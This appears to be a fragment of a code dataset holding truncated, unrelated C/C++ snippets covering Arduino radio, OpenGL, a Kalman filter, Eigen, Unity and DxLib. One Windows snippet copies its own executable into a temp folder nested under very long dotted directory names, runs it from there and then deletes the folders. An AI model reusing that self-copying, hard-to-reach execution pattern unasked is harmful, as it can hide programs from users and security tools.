\u043f\u0440\u0438\u0448\u043b\u0438 \u043e\u0442 3 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0430 (\u043f\u043e 3 \u0442\u0440\u0443\u0431\u0435), \u0442\u043e \u043c\u043e\u0436\u043d\u043e \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0443\u044e\u0449\u0435\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 ...\n        if(pipeNo==4){ /* \u0414\u0430\u043d\u043d\u044b\u0435 \u043f\u0440\u0438\u0448\u043b\u0438 \u043f\u043e 4 \u0442\u0440\u0443\u0431\u0435 */ \n                      radio.stopListening   ();                      ",
    "#include \"stdafx.h\"\n\n_NT_BEGIN\n\nEXTERN_C_START\n\nNTSYSAPI\nNTSTATUS\nNTAPI\nRtlGetLastNtStatus();\n\nNTSYSAPI\nNTSTATUS\nNTAPI\nNtAlertThread(_In_ HANDLE hThread);\n\nNTSYSAPI\nNTSTATUS\nNTAPI\nNtDelayExecution(_In_ BOOLEAN Alertable, _In_ PLARGE_INTEGER Interval);\n\nEXTERN_C_END\n\ninline HANDLE fixH(HANDLE hFile)\n{\n\treturn hFile == INVALID_HANDLE_VALUE ? 0 : hFile;\n}\n\nHRESULT NTAPI GetLastErrorEx(ULONG dwError = GetLastError())\n{\n\tNTSTATUS status = RtlGetLastNtStatus();\n\treturn dwError == RtlNtStatusToDosErrorNoTeb(status) ? HRESULT_FROM_NT(status) : HRESULT_FROM_WIN32(dwError);\n}\n\nint ShowErrorBox(HWND hwnd, HRESULT dwError, PCWSTR lpCaption, UINT uType)\n{\n\tint r = 0;\n\tLPCVOID lpSource = 0;\n\tULONG dwFlags = FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS;\n\n\tif ((dwError & FACILITY_NT_BIT) || (0 > dwError && HRESULT_FACILITY(dwError) == FACILITY_NULL))\n\t{\n\t\tdwError &= ~FACILITY_NT_BIT;\n\t__nt:\n\t\tdwFlags = FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS;\n\n\t\tlpSource = GetModuleHandle(L\"ntdll\");\n\t}\n\n\tPWSTR lpText;\n\tif (FormatMessageW(dwFlags, lpSource, dwError, 0, (PWSTR)&lpText, 0, 0))\n\t{\n\t\tr = MessageBoxW(hwnd, lpText, lpCaption, uType);\n\t\tLocalFree(lpText);\n\t}\n\telse if (dwFlags & FORMAT_MESSAGE_FROM_SYSTEM)\n\t{\n\t\tgoto __nt;\n\t}\n\n\treturn r;\n}\n\nHRESULT CopySelf(POBJECT_ATTRIBUTES to)\n{\n\tNTSTATUS status = STATUS_NO_MEMORY;\n\n\tif (PWSTR buf = new WCHAR[MINSHORT])\n\t{\n\t\tif (NOERROR == (status = (GetModuleFileNameW(0, buf, MINSHORT), GetLastError())))\n\t\t{\n\t\t\tif (HANDLE hFile = fixH(CreateFileW(buf, FILE_GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0)))\n\t\t\t{\n\t\t\t\tIO_STATUS_BLOCK iosb;\n\t\t\t\tFILE_STANDARD_INFORMATION fsi;\n\t\t\t\tif (0 <= (status = NtQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation)))\n\t\t\t\t{\n\t\t\t\t\tif (fsi.EndOfFile.QuadPart)\n\t\t\t\t\t{\n\t\t\t\t\t\tHANDLE hFileTo;\n\t\t\t\t\t\tif (0 <= (status = NtCreateFile(&hFileTo, FILE_APPEND_DATA | SYNCHRONIZE, to, &iosb, &fsi.EndOfFile,\n\t\t\t\t\t\t\tFILE_ATTRIBUTE_TEMPORARY, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, 0, 0)))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tULONG Bytes;\n\n\t\t\t\t\t\t\tdo\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tBytes = MINSHORT * sizeof(WCHAR);\n\n\t\t\t\t\t\t\t\tif ((ULONGLONG)fsi.EndOfFile.QuadPart < Bytes)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tBytes = fsi.EndOfFile.LowPart;\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tif (0 > (status = NtReadFile(hFile, 0, 0, 0, &iosb, buf, Bytes, 0, 0)))\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tif (iosb.Information != Bytes)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tstatus = STATUS_INTERNAL_ERROR;\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tif (0 > (status = NtWriteFile(hFileTo, 0, 0, 0, &iosb, buf, Bytes, 0, 0)))\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tif (iosb.Information != Bytes)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tstatus = STATUS_INTERNAL_ERROR;\n\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t} while (fsi.EndOfFile.QuadPart -= Bytes);\n\n\t\t\t\t\t\t\tNtClose(hFileTo);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tNtClose(hFile);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tstatus = GetLastErrorEx();\n\t\t\t}\n\t\t}\n\n\t\tdelete[] buf;\n\t}\n\n\treturn status;\n}\n\nHRESULT CopyDeep()\n{\n\tULONG cch = MINSHORT / 2 - 0x1000;\n\tNTSTATUS status = STATUS_NO_MEMORY;\n\n\tif (PWSTR buf = new WCHAR[cch])\n\t{\n\t\tstatic const WCHAR global[] = L\"\\\\??\\\\\";\n\n\t\tmemcpy(buf, global, sizeof(global) - sizeof(WCHAR));\n\t\tPWSTR psz = buf + _countof(global) - 1;\n\t\tcch -= _countof(global) - 1;\n\n\t\tif (ULONG len = GetEnvironmentVariableW(L\"tmp\", psz, cch))\n\t\t{\n\t\t\tif (len + 2 < cch)\n\t\t\t{\n\t\t\t\tpsz += len, cch -= len;\n\n\t\t\t\tPWSTR pc = psz;\n\n\t\t\t\tUNICODE_STRING ObjectName = { 0, 0, buf };\n\t\t\t\tOBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName, OBJ_CASE_INSENSITIVE };\n\n\t\t\t\tgoto __0;\n\t\t\t\twhile (0x102 < cch)\n\t\t\t\t{\n\t\t\t\t\tRtlFillMemoryUlong(psz, 0x100 * sizeof(WCHAR), ('.' << 16) + '.');\n\t\t\t\t\t*psz = '\\\\', psz += 0x100, cch -= 0x100;\n\n\t\t\t\t__0:\n\t\t\t\t\tObjectName.MaximumLength = ObjectName.Length = (USHORT)RtlPointerToOffset(buf, psz);\n\t\t\t\t\tIO_STATUS_BLOCK iosb;\n\t\t\t\t\tHANDLE hFile;\n\t\t\t\t\tif (0 > (status = NtCreateFile(&hFile, SYNCHRONIZE, &oa, &iosb, 0, 0,\n\t\t\t\t\t\tFILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF, FILE_DIRECTORY_FILE, 0, 0)))\n\t\t\t\t\t{\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\n\t\t\t\t\tNtClose(hFile);\n\t\t\t\t}\n\n\t\t\t\t*psz++ = '\\\\';\n\t\t\t\t*psz++ = '!';\n\n\t\t\t\tif (0 <= status)\n\t\t\t\t{\n\t\t\t\t\tObjectName.MaximumLength = ObjectName.Length += 2 * sizeof(WCHAR);\n\t\t\t\t\tif (S_OK == (status = CopySelf(&oa)))\n\t\t\t\t\t{\n\t\t\t\t\t\t*psz = 0;\n\t\t\t\t\t\tSTARTUPINFOW si{ sizeof(si) };\n\t\t\t\t\t\tPROCESS_INFORMATION pi;\n\t\t\t\t\t\tbuf[1] = '\\\\';\n\t\t\t\t\t\tif (CreateProcessW(buf, const_cast<PWSTR>(L\"\\n\"), 0, 0, 0, 0, 0, 0, &si, &pi))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tShowErrorBox(0, S_OK, L\"!\", MB_ICONINFORMATION);\n\t\t\t\t\t\t\tNtAlertThread(pi.hThread);\n\t\t\t\t\t\t\tNtClose(pi.hThread);\n\t\t\t\t\t\t\tWaitForSingleObject(pi.hProcess, INFINITE);\n\t\t\t\t\t\t\tNtClose(pi.hProcess);\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstatus = GetLastErrorEx();\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbuf[1] = '?';\n\t\t\t\t\t\t*psz++ = '\\\\';\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\twhile (pc < --psz)\n\t\t\t\t{\n\t\t\t\t\tif ('\\\\' == *psz)\n\t\t\t\t\t{\n\t\t\t\t\t\tObjectName.MaximumLength = ObjectName.Length = (USHORT)RtlPointerToOffset(buf, psz);\n\t\t\t\t\t\tif (0 > ZwDeleteFile(&oa))\n\t\t",
    "#include <iostream>\r\n#include <conio.h>\r\n#include <stdlib.h>\r\n#include <limits> // Include <limits> for input validation\r\nusing namespace std;\r\n//functions\r\nvoid main_menu();\r\nvoid add_new_marks();\r\nvoid print_marks_sheet();\r\nvoid print_grade_sheet();\r\nvoid print_data_summary();\r\n//global array\r\nint marks[10];\r\n//create a menu\r\nint main()\r\n{\r\n    int n;\r\n    do\r\n    {\r\n        //call main_menu function\r\n        main_menu();\r\n        while (!(cin >> n) || cin.peek() != '\\n') { // Input validation\r\n            cout << \"\\n\\tInvalid Input! Please choose a number from the menu (1-5)\" << endl;\r\n            main_menu();\r\n            cin.clear();\r\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n\r\n        }\r\n        //what will happen after choose a number from a displayed menu\r\n        switch(n)\r\n        {\r\n        case 1 :\r\n            cout << \"\\n[1] Add new Student Marks\" << endl;\r\n            add_new_marks();\r\n            break;\r\n        case 2 :\r\n            cout << \"\\n[2] Print Marks Sheet\" << endl;\r\n            print_marks_sheet();\r\n            break;\r\n        case 3 :\r\n            cout << \"\\n[3] Print Grade Sheet\" << endl;\r\n            print_grade_sheet();\r\n            break;\r\n        case 4 :\r\n            cout << \"\\n[4] Print Summary Sheet\" << endl;\r\n            print_data_summary();\r\n            break;\r\n        case 5 :\r\n            cout << \"\\n[5] Exit\" << endl;\r\n            system(\"cls\");\r\n            cout << \"\\n\\tEnd of the Operation! See you Later!\" << endl;\r\n\r\n            break;\r\n        default :\r\n            cout << \"\\n\\tInvalid Input! Please choose a number from the menu (1-5)\" << endl;\r\n            break;\r\n        }\r\n    }\r\n    while(n!=5);\r\n}\r\nvoid main_menu()\r\n{\r\n    //display menu\r\n    cout << \"\\n\" << endl;\r\n    cout << \"--------------------------\" << endl;\r\n    cout << \"  Result Sheet Generator \" << endl;\r\n    cout << \"--------------------------\" << endl;\r\n    cout << \"[1] Add new Student Marks\" << endl;\r\n    cout << \"[2] Print Mark Sheet\" << endl;\r\n    cout << \"[3] Print Grade Sheet\" << endl;\r\n    cout << \"[4] Print Summary Sheet\" << endl;\r\n    cout << \"[5] Exit\" << endl;\r\n    cout << \"--------------------------\" << endl;\r\n    cout << \"\\n\\nChoose a number from the Menu : \";\r\n}\r\nvoid add_new_marks()\r\n{\r\n    system(\"cls\");\r\n    //validate entered marks\r\n    cout << \"\\nEnter Marks (0-100) of the 10 Students\" << endl;\r\n    for (int i=0 ; i<10 ; i++)\r\n        {\r\n            cout << \"Enter the mark of Student \" << i+1 << \": \";\r\n            while (!(cin >> marks[i]) || cin.peek() != '\\n' || marks[i] < 0 || marks[i] > 100 || marks[i] != static_cast<int>(marks[i])) {\r\n                cout << \"Invalid input! Mark must be an integer between 0 and 100. Please enter again! \";\r\n                cout << \"\\nEnter the mark of Student \" << i+1 << \": \";\r\n                cin.clear();\r\n                cin.ignore(numeric_limits<streamsize>::max(), '\\n');\r\n        }\r\n}\r\n}\r\nvoid print_marks_sheet()\r\n{\r\n    system(\"cls\");\r\n    //display marks sheet\r\n    cout << \"\\n\" << endl;\r\n    cout << \"-------------\" << endl;\r\n    cout << \" Marks Sheet \" << endl;\r\n    cout << \"-------------\" << endl;\r\n    cout << \"\\nID\" << \"\\t\" << \"SUB1\\n\" << endl;\r\n    for (int i=0 ; i<10 ; i++)\r\n        cout << i+1 << \"\\t \" << marks[i] << endl;\r\n    cout << \"-------------\" << endl;\r\n}\r\nvoid print_grade_sheet()\r\n{\r\n    system(\"cls\");\r\n    //earned grade\r\n    string grade;\r\n    cout << \"\\n\" << endl;\r\n    cout << \"-------------\" << endl;\r\n    cout << \" Grade Sheet \" << endl;\r\n    cout << \"-------------\" << endl;\r\n    cout << \"\\nID\" << \"\\t\" << \"SUB1\\n\" << endl;\r\n    for (int i=0 ; i<10 ; i++)\r\n    {\r\n        //grade calculation formulas\r\n        if (marks[i] >= 90 && marks[i] <=100)\r\n             grade=\"A+\";\r\n        if (marks[i] >= 80 && marks[i] <=89)\r\n             grade=\"A\";\r\n        if (marks[i] >= 70 && marks[i] <=79)\r\n             grade=\"B+\";\r\n        if (marks[i] >= 60 && marks[i] <=69)\r\n             grade=\"B\";\r\n        if (marks[i] >= 50 && marks[i] <=59)\r\n             grade=\"C+\";\r\n        if (marks[i] >= 40 && marks[i] <=49)\r\n             grade=\"C\";\r\n        if (marks[i] >= 30 && marks[i] <=39)\r\n             grade=\"D+\";\r\n        if (marks[i] >= 20 && marks[i] <=29)\r\n             grade=\"D\";\r\n        if (marks[i] < 20)\r\n             grade=\"E\";\r\n        cout << i+1 << \"\\t \" << grade << endl;\r\n    }\r\n    cout << \"-------------\" << endl;\r\n}\r\nvoid print_data_summary()\r\n{\r\n    system(\"cls\");\r\n    //display class summary with Average,min and max\r\n    float sum=0;\r\n    int i;\r\n    cout << \"\\n\" << endl;\r\n    cout << \"----------------------\" << endl;\r\n    cout << \"    Class Summary     \" << endl;\r\n    cout << \"----------------------\" << endl;\r\n    cout << \"\\t\\tSUB1\" << endl;\r\n    //calculate Average\r\n    for (int i=0 ; i<10 ; i++)\r\n            sum += marks[i];\r\n    cout << \"Average\" << \"\\t\\t\" << sum/10 << endl;\r\n    //find min and max\r\n    int max=marks[0],min=marks[0];\r\n    for (i=0 ; i<10 ; i++)\r\n    {\r\n        if (marks[i]>max)\r\n   ",
    "//\n//  primitive.cpp\n//  GV_Core_with_OpenGL\n//\n//  Created by ChanningTong on 6/9/24.\n//\n\n#include <iostream>\n#include \"primitive.hpp\"\n#include \"glexception.hpp\"\n#include \"commander.hpp\"\n#include \"window.hpp\"\n#include \"camera.hpp\"\nPrimitive::Primitive(vertexArray vertices,Shape shape,GLsizei stride):stride(stride){\n    if (!HAS_INIT_OPENGL_CONTEXT)\n        initOpenGL(WindowParas::getInstance().window);\n    this->vertices = vertices;\n    this->indices.clear();\n    switch (shape) {\n        case Shape::POINTS:{\n            this->shape = GL_POINTS;\n            this->type = DrawType::Array;\n            break;\n        }\n        case Shape::LINES:{\n            this->shape = GL_LINES;\n            this->type = DrawType::Array;\n            break;\n        }\n        case Shape::TRIANGLE:{\n            this->shape = GL_TRIANGLES;\n            this->type = DrawType::Array;\n            break;\n        }\n        case Shape::RECTANGLE:{\n            this->shape = GL_TRIANGLE_FAN;\n            this->type = DrawType::Array;\n            break;\n        }\n        case Shape::CIRCLE:{ //not achieved\n            this->shape = GL_TRIANGLE_STRIP;\n            this->type = DrawType::Index;\n            //this->indices = pr\n            break;\n        }\n        case Shape::LOOP:{\n            this->shape = GL_LINE_LOOP;\n            this->type = DrawType::Array;\n            break;\n        }\n        case Shape::POLYGEN:{\n            if (ShaderStyle::getStyle().toFill)\n                this->shape = GL_TRIANGLE_FAN;\n            else\n                this->shape = GL_LINE_LOOP;\n            this->type = DrawType::Array;\n            break;;\n        }\n        default:{\n            this->shape = GL_POINT;\n            this->type = DrawType::Array;\n            break;\n        }\n    }\n    shader = nullptr;\n    glGenVertexArrays(1,&identifier.VAO);\n    glBindVertexArray(identifier.VAO);\n    glGenBuffers(1,&identifier.VBO);\n    glBindBuffer(GL_ARRAY_BUFFER, identifier.VBO);\n    glBufferData(GL_ARRAY_BUFFER, static_cast<GLsizei>(vertices.size() * sizeof(GLfloat)) ,static_cast<const void*>(vertices.data()), GL_STATIC_DRAW);\n    if (!indices.empty()){\n        glGenBuffers(1, &identifier.EBO);\n        glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, identifier.EBO);\n        glBufferData(GL_ELEMENT_ARRAY_BUFFER,  static_cast<GLsizei>(indices.size() * sizeof(GLuint)), static_cast<const void*>(indices.data()), GL_STATIC_DRAW);\n    }\n    glBindBuffer(GL_ARRAY_BUFFER, 0);\n    glBindVertexArray(0);\n}\nvoid Primitive::load(){\n    glBindVertexArray(identifier.VAO);\n    glBindBuffer(GL_ARRAY_BUFFER, identifier.VBO);\n    if (type == DrawType::Index)\n        glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, identifier.EBO);\n    glVertexAttribPointer(0,3,GL_FLOAT,GL_FALSE,3 * sizeof (GLfloat),(GLvoid *)0);\n    glEnableVertexAttribArray(0);\n}\nvoid Primitive::draw(){\n    //std::cout<<\"Draw is running\"<<std::endl;\n    GLint currentBuffer;\n    if (shader == nullptr){\n        std::cerr<<\"havn't bind shader\";\n        return;\n    }\n    else\n        shader ->use();\n    glGetIntegerv(GL_ARRAY_BUFFER_BINDING, &currentBuffer);\n    if (currentBuffer != identifier.VBO){\n        //std::cout<<currentBuffer<<' '<<VBO<<std::endl;\n        load();\n    }\n    glEnableVertexAttribArray(0);\n    glBindVertexArray(identifier.VAO);\n    //std::cout<<VAO<<std::endl;\n    if (type == DrawType::Array){\n        //glDrawArrays(shape, 0,( getVertexNum()-1)*6);\n        glDrawArrays(shape, 0, getVertexNum());\n       // CHECK_GL_ERROR(glDrawArrays(shape, 0, vertexCount));\n    }\n    if (type == DrawType::Index){\n        glDrawElements(shape, indexLen, GL_UNSIGNED_INT, 0);\n        //CHECK_GL_ERROR( glDrawElements(shape, indexLen, GL_UNSIGNED_INT, 0));\n    }\n    shader->rend();\n    glBindVertexArray(0);\n    return;\n}\n\nnamespace pr {\nstd::vector<std::unique_ptr<Primitive> >mainPrimitiveList;\npPrimitive drawPreviewPrimitive = nullptr;\nstatic const indexArray rectIndex ={\n    0, 1, 3,//right-top,right-button,left-top\n    1, 2, 3//right-button,left-button,left-top\n};\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include \"KalmanFilter3D.h\"\n\n// Function to generate random noise\ndouble generateNoise(double stddev) {\n    double u = ((double)rand() / (RAND_MAX)) * 2 - 1;\n    double v = ((double)rand() / (RAND_MAX)) * 2 - 1;\n    double w = ((double)rand() / (RAND_MAX));\n    double c = std::sqrt(-2 * std::log(w)) / std::sqrt(u * u + v * v);\n    return stddev * u * c;\n}\n\n// Function to simulate the true position of the ball\nvoid simulateTruePosition(double& x, double& y, double& z, double vx, double vy, double vz, double dt) {\n    x += vx * dt;\n    y += vy * dt;\n    z += vz * dt;\n}\n\n// Function to simulate noisy measurements\nvoid simulateMeasurement(double& x, double& y, double& z, double stddev) {\n    x += generateNoise(stddev);\n    y += generateNoise(stddev);\n    z += generateNoise(stddev);\n}\n\nint main() {\n    srand(time(0)); // Seed the random number generator\n\n    // Time step\n    double dt = 0.1;\n\n    // Process noise standard deviation\n    double process_noise_std = 0.1;\n\n    // Measurement noise standard deviation\n    double measurement_noise_std = 0.5;\n\n    // Initialize the Kalman filter\n    KalmanFilter3D kf(dt, process_noise_std, measurement_noise_std);\n\n    // Initial true position and velocity of the ball\n    double true_x = 0, true_y = 0, true_z = 0;\n    double true_vx = 1, true_vy = 0.5, true_vz = 0.2;\n\n    // Simulate and track the ball for 100 time steps\n    for (int i = 0; i < 100; ++i) {\n        // Simulate the true position of the ball\n        simulateTruePosition(true_x, true_y, true_z, true_vx, true_vy, true_vz, dt);\n\n        // Simulate noisy measurements\n        double measured_x = true_x;\n        double measured_y = true_y;\n        double measured_z = true_z;\n        simulateMeasurement(measured_x, measured_y, measured_z, measurement_noise_std);\n\n        // Predict the position using the Kalman filter\n        kf.predict();\n\n        // Update the Kalman filter with the measured position\n        double z[3] = { measured_x, measured_y, measured_z };\n        kf.update(z);\n\n        // Get the estimated position from the Kalman filter\n        double estimated_state[6];\n        kf.getState(estimated_state);\n\n        // Print the true position, measured position, and estimated position\n        std::cout << \"Time step \" << i << \":\\n\";\n        std::cout << \"True position: (\" << true_x << \", \" << true_y << \", \" << true_z << \")\\n\";\n        std::cout << \"Measured position: (\" << measured_x << \", \" << measured_y << \", \" << measured_z << \")\\n\";\n        std::cout << \"Estimated position: (\" << estimated_state[0] << \", \" << estimated_state[1] << \", \" << estimated_state[2] << \")\\n\";\n        std::cout << \"----------\\n\";\n    }\n\n    return 0;\n}",
    "#include <fixed_point_constraints.h>\n#include <algorithm>\nvoid fixed_point_constraints(Eigen::SparseMatrix<double> &P, unsigned int q_size, unsigned int dim, const std::vector<unsigned int> indices) {\n    P = Eigen::SparseMatrix<double>(q_size - dim * indices.size(), q_size);\n    // calculate the index for non-fixed vertices\n    Eigen::VectorXi nonfixed_id(q_size/dim);\n    nonfixed_id.setZero();\n    for(int i = 0; i < indices.size(); i++)\n        nonfixed_id[indices[i]] = -1;\n    int count = 0;\n    for(int i = 0; i < q_size/dim; i++) {\n        if(nonfixed_id[i] != -1)\n            nonfixed_id[i] = count++;\n    }\n\n    // set the cooresponding dimxdim blocks to identity\n    std::vector<Eigen::Triplet<double>> triplets;\n    auto setIdentity = [](std::vector<Eigen::Triplet<double>>& triplets, int dim, int start_row, int start_col) {\n        for(int i = 0; i < dim; i++)\n            triplets.push_back(Eigen::Triplet<double>(start_row+i, start_col+i, 1));\n    };\n    for(int i = 0; i < q_size/dim; i++) {\n        if(nonfixed_id[i] != -1) {\n            int start_row = nonfixed_id[i] * dim;\n            int start_col = i * dim;\n            setIdentity(triplets, dim, start_row, start_col);\n        }\n    }\n    P.setFromTriplets(triplets.begin(), triplets.end());  \n}",
    "//Generated lump file. generated by Bee.NativeProgramSupport.Lumping\n#include \"/Applications/Unity/Hub/Editor/2022.3.31f1/Unity.app/Contents/il2cpp/libil2cpp/icalls/mscorlib/System/CLRConfig.cpp\"\n#include \"/Applications/Unity/Hub/Editor/2022.3.31f1/Unity.app/Contents/il2cpp/libil2cpp/icalls/mscorlib/System/ConsoleDriver.cpp\"\n#include \"/Applications/Unity/Hub/Editor/2022.3.31f1/Unity.app/Contents/il2cpp/libil2cpp/icalls/mscorlib/System/Delegate.cpp\"\n#include \"/Applications/Unity/Hub/Editor/2022.3.31f1/Unity.app/Contents/il2cpp/libil2cpp/icalls/mscorlib/System/Enum.cpp\"\n#include \"/Applications/Unity/Hub/Editor/2022.3.31f1/Unity.app/Contents/il2cpp/libil2cpp/icalls/mscorlib/System/Environment.cpp\"\n#include \"/Applications/Unity/Hub/Editor/2022.3.31f1/Unity.app/Contents/il2cpp/libil2cpp/icalls/mscorlib/System/Exception.cpp\"\n#include \"/Applications/Unity/Hub/Editor/2022.3.31f1/Unity.app/Contents/il2cpp/libil2cpp/icalls/mscorlib/System/Number.cpp\"\n#include \"/Applications/Unity/Hub/Editor/2022.3.31f1/Unity.app/Contents/il2cpp/libil2cpp/icalls/mscorlib/System/String.cpp\"\n#include \"/Applications/Unity/Hub/Editor/2022.3.31f1/Unity.app/Contents/il2cpp/libil2cpp/icalls/mscorlib/System/TypedReference.cpp\"\n#include \"/Applications/Unity/Hub/Editor/2022.3.31f1/Unity.app/Contents/il2cpp/libil2cpp/icalls/mscorlib/System/ValueType.cpp\"\n",
    "\ufeff#include\"DxLib.h\"\n#include\"WorldSprite.h\"\n\n/// <summary>\n/// \u521d\u671f\u5316\n/// </summary>\n/// <param name=\"textureGraph\">\u30c6\u30af\u30b9\u30c1\u30e3\u306e\u753b\u50cf\u30cf\u30f3\u30c9\u30eb</param>\n/// <param name=\"chipPixelSize\">\u30b9\u30d7\u30e9\u30a4\u30c8\u306e\uff11\u30c1\u30c3\u30d7\u306e\u30d4\u30af\u30bb\u30eb\u30b5\u30a4\u30ba</param>\n/// <param name=\"spriteNo\">\u30b9\u30d7\u30e9\u30a4\u30c8\u756a\u53f7</param>\nvoid WorldSprite::Initialize(int textureGraph, int chipPixelSize, int spriteNo)\n{\n    //\u30de\u30c3\u30d7\u306e\u30c1\u30c3\u30d7\u30b0\u30e9\u30d5\u3092\u30ef\u30fc\u30eb\u30c9\u30b9\u30d7\u30e9\u30a4\u30c8\u306e\u30c6\u30af\u30b9\u30c1\u30e3\u30b0\u30e9\u30d5\u306b\u4ee3\u5165\n    this->textureGraph = textureGraph;\n\n    // NOTE:\u521d\u671f\u5316\u6642\u306b\u56fa\u5b9a\u3057\u3066\u3044\u308b\u304c\u3001\u5909\u66f4\u3057\u305f\u3051\u308c\u3070\u81ea\u5206\u3067\u95a2\u6570\u3092\u8ffd\u52a0\u3059\u308b\u5fc5\u8981\u304c\u3042\u308b\n    // \uff14\u9802\u70b9\u5206\u306euv\u30c7\u30fc\u30bf\u3092\u8a2d\u5b9a\n    int texW, texH;\n    //\u30c1\u30c3\u30d7\u30b0\u30e9\u30d5\u306e\u7e26\u65b9\u5411\u3068\u6a2a\u65b9\u5411\u306e\u30b5\u30a4\u30ba\u3092\u30b2\u30c3\u30c8\n    GetGraphTextureSize(textureGraph, &texW, &texH);\n    //\u5e45\u304b\u3089\u4e00\u3064\u306e\u30b5\u30a4\u30ba\u3092\u5272\u3063\u3066\u6570\u3092\u51fa\u3059\n    //\u5e45\u3068\u9ad8\u3055\u306f\u540c\u3058\u306a\u306e\u3067\u4e00\u3064\u306b\n    int chipXNum = texW / chipPixelSize;\n    int chipYNum = texH / chipPixelSize;\n    //\u3053\u3053\u3067divgraph\u3092\u624b\u52d5\u3067\u884c\u3063\u3066\u3044\u308b\u307f\u305f\u3044\u306a\u611f\u3058\n    int chipNoX = spriteNo % chipXNum;       //\u5217\u306e\u6307\u5b9a\n    int chipNoY = spriteNo / chipXNum;       //\u884c\u306e\u6307\u5b9a\n    float oneChipUVXRate = 1.0f / (float)chipXNum;   // \u30c6\u30af\u30b9\u30c1\u30e3\u5168\u90e8\u30921.0\u3068\u3057\u305f\u6642\u306ecihp\u4e00\u500b\u306b\u5bfe\u3059\u308buv\u306e\u30b5\u30a4\u30ba\n    float oneChipUVYRate = 1.0f / (float)chipYNum;\n    //\u30c6\u30af\u30b9\u30c1\u30e3\u306e\u5ea7\u6a19\u306e\u8a2d\u5b9a\n    // 0.0\u306a\u3089x1\u3082\u3057\u304f\u306fy1\u3000//1.0\u306a\u3089x2\u3082\u3057\u304f\u306fy2\n    //\u30c6\u30af\u30b9\u30c1\u30e3\u3092\u5f35\u308b4\u3064\u306e\u5ea7\u6a19\uff1d\u3053\u306e\u5ea7\u6a19\u306e\u5217or\u884c\u6570+\n    Vertex[0].u = (chipNoX + 0.0f) * oneChipUVXRate;     //\u30c1\u30c3\u30d7\u306e\u5de6\u4e0a\u306ex\u5ea7\u6a19\n    Vertex[0].v = (chipNoY + 0.0f) * oneChipUVYRate;     //\u30c1\u30c3\u30d7\u306e\u5de6\u4e0a\u306eY\u5ea7\u6a19\n    Vertex[1].u = (chipNoX + 1.0f) * oneChipUVXRate;     //\u30c1\u30c3\u30d7\u306e\u53f3\u4e0a\u306ex\u5ea7\u6a19\n    Vertex[1].v = (chipNoY + 0.0f) * oneChipUVYRate;     //\u30c1\u30c3\u30d7\u306e\u53f3\u4e0a\u306ey\u5ea7\u6a19\n    Vertex[2].u = (chipNoX + 0.0f) * oneChipUVXRate;     //\u30c1\u30c3\u30d7\u306e\u5de6\u4e0b\u306ex\u5ea7\u6a19\n    Vertex[2].v = (chipNoY + 1.0f) * oneChipUVYRate;     //\u30c1\u30c3\u30d7\u306e\u53f3\u4e0a\u306ey\u5ea7\u6a19\n    Vertex[3].u = (chipNoX + 1.0f) * oneChipUVXRate;     //\u30c1\u30c3\u30d7\u306e\u53f3\u4e0b\u306ex\u5ea7\u6a19\n    Vertex[3].v = (chipNoY + 1.0f) * oneChipUVYRate;     //\u30c1\u30c3\u30d7\u306e\u53f3\u4e0b\u306ey\u5ea7\u6a19\n\n    // \u30c7\u30a3\u30d5\u30e5\u30fc\u30ba\u3001\u30b9\u30da\u30ad\u30e5\u30e9\u306f\u521d\u671f\u5316\u6642\u306b\u56fa\u5b9a(\u3053\u3053\u306f\u6c17\u306b\u3057\u306a\u3044)\n    for (int i = 0; i < 4; i++)\n    {\n        Vertex[i].dif = GetColorU8(255, 255, 255, 255);\n        Vertex[i].spc = GetColorU8(0, 0, 0, 0);\n        Vertex[i].norm = VGet(0.0f, 0.0f, -1.0f);   // \u56de\u8ee2\u3092\u30b5\u30dd\u30fc\u30c8\u3057\u306a\u3044\u306e\u3067\u30ce\u30fc\u30de\u30eb\u3082\u56fa\u5b9a\n\n        // 